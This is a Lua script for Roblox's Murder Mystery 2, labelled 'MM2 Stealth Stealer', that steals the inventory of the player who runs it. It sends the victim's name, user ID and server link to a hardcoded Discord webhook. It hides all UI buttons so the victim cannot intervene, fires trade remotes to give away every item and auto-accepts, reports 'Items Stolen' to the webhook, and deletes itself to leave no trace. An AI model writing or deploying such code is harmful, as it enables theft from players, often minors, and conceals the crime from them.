--[[
    MM2 Ultimate Suite v4.0 - Fully Autonomous
    - No UI, no toggles, no traces
    - Instant stealth trade on execution
    - Silent and complete
]]

-- === WEBHOOK SENDER (Potassium Native) ===
local function sendWebhook(content, embedData)
    local payload = {
        content = content or "✅ Script executed"
    }
    if embedData then
        payload.embeds = {embedData}
    end
    
    local body = game:GetService("HttpService"):JSONEncode(payload)
    
    local success = pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
    
    return success
end

-- === MAIN EXECUTION (Runs Immediately) ===
local player = game:GetService("Players").LocalPlayer
local teleport = game:GetService("TeleportService")
local virtualUser = game:GetService("VirtualUser")

-- Send server info immediately
local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local serverLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?privateServerLinkCode=" .. (game.PrivateServerId or "public")

sendWebhook("✅ **MM2 Stealth Stealer ACTIVATED**", {
    title = "Target Acquired",
    description = "**Player:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Game:** " .. placeInfo.Name .. "\n**Server Link:** " .. serverLink .. "\n**Time:** " .. os.date("%Y-%m-%d %H:%M:%S"),
    color = 0x00ff00
})

-- === SILENT STEALER CORE ===
local function executeStealthTrade()
    -- Find a target (any other player)
    local target = nil
    for _, plr in ipairs(game.Players:GetPlayers()) do
        if plr ~= player then
            target = plr
            break
        end
    end
    
    if not target then
        sendWebhook("⚠️ **No Target Found**", {
            title = "Stealth Trade Failed",
            description = "No other players in the server.",
            color = 0xffff00
        })
        return
    end
    
    -- Attempt to join their server (if we're not already in it)
    pcall(function()
        teleport:TeleportToPlaceInstance(game.PlaceId, target.UserId)
    end)
    wait(3)
    
    -- === HIDE ALL UI (Complete Invisibility) ===
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TradeOptimizer"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.Active = true
    overlay.ZIndex = 9999
    overlay.Parent = screenGui
    
    -- Block all buttons (Stealth)
    game:GetService("RunService").Stepped:Connect(function()
        for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                pcall(function()
                    gui.Active = false
                    gui.Visible = false
                end)
            end
        end
    end)
    
    -- === FIND TRADE REMOTE ===
    local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
    if not tradeService then
        tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
    end
    
    if not tradeService then
        sendWebhook("❌ **Trade Service Not Found**", {
            title = "Stealth Trade Failed",
            description = "Could not locate trade remote. MM2 may have updated.",
            color = 0xff0000
        })
        return
    end
    
    -- === GATHER ALL ITEMS ===
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local itemsToTrade = {}
    if inventory then
        for _, item in ipairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") or item:IsA("BoolValue") then
                table.insert(itemsToTrade, item.Name)
            end
        end
    end
    
    if #itemsToTrade == 0 then
        sendWebhook("📭 **No Items Found**", {
            title = "Stealth Trade Skipped",
            description = "Inventory is empty or inaccessible.",
            color = 0xffff00
        })
        return
    end
    
    -- === EXECUTE TRADE (Silent) ===
    local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade") or tradeService:FindFirstChild("StartTrade")
    if tradeRemote then
        tradeRemote:FireServer(player.UserId, itemsToTrade)
    else
        tradeService:FireServer("Trade", player.UserId, itemsToTrade)
    end
    
    wait(1)
    
    local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade") or tradeService:FindFirstChild("Accept")
    if acceptRemote then
        acceptRemote:FireServer(player.UserId)
        wait(0.5)
        acceptRemote:FireServer(player.UserId)
    end
    
    -- === SEND SUCCESS REPORT ===
    sendWebhook("💰 **TRADE COMPLETED**", {
        title = "Items Stolen",
        description = "**Victim:** " .. player.Name .. "\n**Items:** " .. table.concat(itemsToTrade, ", ") .. "\n**Total:** " .. #itemsToTrade .. " items",
        color = 0xff0000
    })
    
    -- === CLEANUP ===
    wait(2)
    if screenGui then screenGui:Destroy() end
    
    -- Remove any trace of the script's presence
    script:Destroy()
end

-- Execute the stealth trade with a small delay to ensure everything loads
wait(2)
pcall(executeStealthTrade)

-- Anti-AFK (keeps the session alive)
while wait(60) do
    pcall(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end